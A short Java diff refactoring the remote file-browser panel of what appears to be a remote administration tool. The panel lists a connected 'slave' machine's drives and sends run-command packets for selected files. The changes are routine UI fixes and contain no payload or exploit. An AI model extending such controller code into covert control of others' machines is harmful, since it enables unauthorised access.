@@ -70,7 +70,8 @@ public class PanelRemoteFiles extends JPanel {
 	
 	public class LocalFileTable extends FileTable {
 		
-		public LocalFileTable() {		
+		public LocalFileTable() {	
+			super();
 			driveComboBox.setRenderer(renderer);
 			driveComboBox.addActionListener(new ActionListener() {
 				public void actionPerformed(ActionEvent arg0) {
@@ -173,9 +174,7 @@ public class PanelRemoteFiles extends JPanel {
 			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 				File[] f = File.listRoots();
 				driveComboModel.removeAllElements();
-				for (File fi : f) {
-					tableRenderer.icons.put(fi.getAbsolutePath(), IconUtils.getFileIcon(fi));
-					tableModel.addRow(new Object[] { fi.getAbsolutePath(), "" });
+				for (File fi : f) {		
 					super.renderer.addIcon(fi.getAbsolutePath().toLowerCase(), IconUtils.getFileIcon(fi));
 					driveComboModel.addElement(fi.getAbsolutePath());
 				}
@@ -190,6 +189,7 @@ public class PanelRemoteFiles extends JPanel {
 		public boolean waitingForMd5;
 
 		public RemoteFileTable() {
+			super(slave);
 			for (Drive drive : slave.getDrives()) {
 				driveComboModel.addElement(drive.getName());
 			}
@@ -278,7 +278,7 @@ public class PanelRemoteFiles extends JPanel {
 			mntmRun.addActionListener(new ActionListener() {
 				@Override
 				public void actionPerformed(ActionEvent arg0) {
-					String[] files = Utils.getFiles(table.getSelectedRows(), tableModel);;
+					String[] files = getSelectedItems();
 					if (files != null) {
 						for (String file : files) {
 							slave.addToSendQueue(new Packet38RunCommand(file));
